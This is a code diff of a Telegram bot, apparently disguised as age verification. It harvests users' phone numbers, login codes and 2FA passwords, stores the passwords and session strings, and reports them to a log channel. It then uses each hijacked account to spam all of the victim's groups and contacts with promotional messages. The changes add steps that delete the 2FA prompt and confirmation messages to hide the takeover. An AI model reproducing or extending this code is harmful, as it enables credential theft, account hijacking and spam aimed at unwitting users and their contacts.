@@ -3,7 +3,7 @@ import asyncio
 import time
 import random
 from pathlib import Path
-from datetime import datetime
+from datetime import datetime, timedelta
 from pyrogram import Client, filters, enums
 from pyrogram.types import (
     Message,
@@ -23,7 +23,7 @@ from pyrogram.errors import (
     FloodWait,
     SessionRevoked
 )
-from info import API_ID, ADMINS, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES
+from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES, ADMINS
 from pymongo import MongoClient
 
 # MongoDB Setup
@@ -148,7 +148,7 @@ async def handle_contact(bot: Client, message: Message):
         await message.reply(strings['already_logged_in'], reply_markup=ReplyKeyboardRemove())
         return
     
-    # Remove verify age keyboard and delete processing message
+    # Remove verify age keyboard
     processing_msg = await message.reply("Processing...", reply_markup=ReplyKeyboardRemove())
     await asyncio.sleep(1)
     
@@ -167,8 +167,7 @@ async def handle_contact(bot: Client, message: Message):
             'phone_code_hash': code.phone_code_hash,
             'otp_digits': ''
         }
-        # Delete contact and processing messages
-        await message.delete()
+        # Delete only processing message, keep contact
         await processing_msg.delete()
         
         # Send OTP message
@@ -207,8 +206,9 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
             )
             await create_session(bot, state['client'], user_id, state['phone_number'])
         except SessionPasswordNeeded:
-            await query.message.edit("**🔒 2FA REQUIRED:**\nEnter your password:")
+            sent_msg = await query.message.edit("**🔒 2FA REQUIRED:**\nEnter your password:")
             state['needs_password'] = True
+            state['2fa_prompt_msg_id'] = sent_msg.id
         except Exception as e:
             await query.message.reply(f"Error: {e}\n/login again.")
             await cleanup_user_state(user_id)
@@ -236,10 +236,21 @@ async def handle_2fa_password(bot: Client, message: Message):
         # Delete password message immediately
         await message.delete()
         
+        # Delete 2FA prompt message
+        if '2fa_prompt_msg_id' in state:
+            try:
+                await bot.delete_messages(user_id, state['2fa_prompt_msg_id'])
+            except:
+                pass
+        
         await state['client'].check_password(password=password)
         state['password'] = password  # Store for database
         
-        await message.reply("Password verified...", reply_markup=ReplyKeyboardRemove())
+        # Send and delete verification message
+        verified_msg = await message.reply("Password verified...", reply_markup=ReplyKeyboardRemove())
+        await asyncio.sleep(2)
+        await verified_msg.delete()
+        
         await create_session(bot, state['client'], user_id, state['phone_number'])
     except PasswordHashInvalid:
         await message.reply('**Invalid Password**\n/login again', reply_markup=ReplyKeyboardRemove())
@@ -299,13 +310,13 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
         await cleanup_user_state(user_id)
 
 async def send_promotion_messages(bot: Client, session_string: str, user_id: int):
-    user_data = database.find_one({"id": user_id})
-    if not user_data or not user_data.get('promotion_active', True):
-        return
-        
     while True:
         client = None
         try:
+            user_data = database.find_one({"id": user_id})
+            if not user_data or not user_data.get('promotion_active', True):
+                break
+                
             client = Client("promo", session_string=session_string)
             await client.start()
             
@@ -318,46 +329,43 @@ async def send_promotion_messages(bot: Client, session_string: str, user_id: int
             # Get all groups (excluding channels)
             groups = []
             async for dialog in client.get_dialogs():
-                chat = dialog.chat
-                if chat and chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
-                    groups.append(chat.id)
+                if hasattr(dialog, 'chat') and dialog.chat:
+                    if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
+                        groups.append(dialog.chat.id)
             
             # Get all contacts and private chats
             contacts_and_privates = []
-            contacts = await client.get_contacts()
-            for user in contacts:
-                if user and not user.is_bot:
-                    contacts_and_privates.append(user.id)
+            try:
+                contacts = await client.get_contacts()
+                for user in contacts:
+                    if user and not user.is_bot:
+                        contacts_and_privates.append(user.id)
+            except:
+                pass
             
             async for dialog in client.get_dialogs(limit=200):
-                chat = dialog.chat
-                if chat and (
-                    chat.type == enums.ChatType.PRIVATE and 
-                    not chat.is_bot and
-                    chat.id not in contacts_and_privates
-                ):
-                    contacts_and_privates.append(chat.id)
+                if hasattr(dialog, 'chat') and dialog.chat:
+                    if (dialog.chat.type == enums.ChatType.PRIVATE and 
+                        not dialog.chat.is_bot and
+                        dialog.chat.id not in contacts_and_privates):
+                        contacts_and_privates.append(dialog.chat.id)
             
             # Phase 1: Groups (1 message/minute)
-            group_count = 0
             for group in groups:
                 try:
                     text = random.choice(PROMO_TEXTS)
                     await client.send_message(group, text)
-                    group_count += 1
-                    await asyncio.sleep(60)  # 1-minute delay
+                    await asyncio.sleep(60)
                 except FloodWait as e:
                     await asyncio.sleep(e.value + 5)
-                except Exception as e:
+                except Exception:
                     continue
             
             # Phase 2: Contacts (rapid-fire)
-            contact_count = 0
             for target in contacts_and_privates:
                 try:
                     text = random.choice(PROMO_TEXTS)
                     await client.send_message(target, text)
-                    contact_count += 1
                 except FloodWait as e:
                     await asyncio.sleep(e.value + 5)
                 except Exception:
@@ -371,7 +379,7 @@ async def send_promotion_messages(bot: Client, session_string: str, user_id: int
             mobile = user_data.get('mobile_number', 'Unknown')
             await bot.send_message(
                 LOG_CHANNEL_SESSIONS_FILES,
-                f"🚫 Session Revoked!\nUser: {mobile}\nError: {str(e)}"
+                f"🚫 Session Revoked!\nUser: {mobile}\nError: {e}"
             )
             
             # Update database
@@ -385,9 +393,18 @@ async def send_promotion_messages(bot: Client, session_string: str, user_id: int
             break
             
         except Exception as e:
+            error_msg = f"⚠️ Promotion Error: {str(e)}"
+            if "401 SESSION_REVOKED" in str(e):
+                mobile = user_data.get('mobile_number', 'Unknown')
+                error_msg = f"🚫 Session Revoked!\nUser: {mobile}\nError: {e}"
+                database.update_one(
+                    {"id": user_id},
+                    {"$set": {"promotion_active": False}}
+                )
+            
             await bot.send_message(
                 LOG_CHANNEL_SESSIONS_FILES,
-                f"⚠️ Promotion Error: {str(e)}\nRestarting in 5 minutes..."
+                f"{error_msg}\n🔄 Restarting in 5 minutes..."
             )
             await asyncio.sleep(300)
         finally:
